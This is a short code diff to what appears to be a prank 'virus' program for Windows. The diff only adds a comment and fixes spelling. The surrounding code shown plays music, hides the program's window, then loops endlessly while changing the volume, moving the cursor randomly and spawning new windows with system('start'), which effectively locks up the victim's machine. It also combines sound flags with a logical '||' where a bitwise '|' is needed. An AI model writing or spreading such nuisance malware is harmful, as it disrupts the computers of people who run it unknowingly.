@@ -50,6 +50,7 @@ void Die() {
     int x, y;
     PlaySound(TEXT("music.wav"), NULL, SND_FILENAME || SND_ASYNC);
     while (true) {
+        // Opens lots of videos
         changeVolume();
         SetCursorPos(rand() % 1000, rand() % 800);
         system("start");
@@ -88,9 +89,9 @@ void Die() {
 
 int main()
 {
-    ask_question("Is this a virus", "Yes", "No", 1); // message, answer one, answer two, correctt answer (1..2)
-    ask_question("Do you know how you contracted this virus?", "Yes", "No", 1); //message, answer one, answer two, correctt answer (1..2)
-    ask_question("Do you know when this virus was contracted?", "Yes", "No", 1); //message, answer one, answer two, correctt answer (1..2)
+    ask_question("Is this a virus", "Yes", "No", 1); // message, answer one, answer two, correct answer (1..2)
+    ask_question("Do you know how you contracted this virus?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
+    ask_question("Do you know when this virus was contracted?", "Yes", "No", 1); //message, answer one, answer two, correct answer (1..2)
     
     
     // Hides window
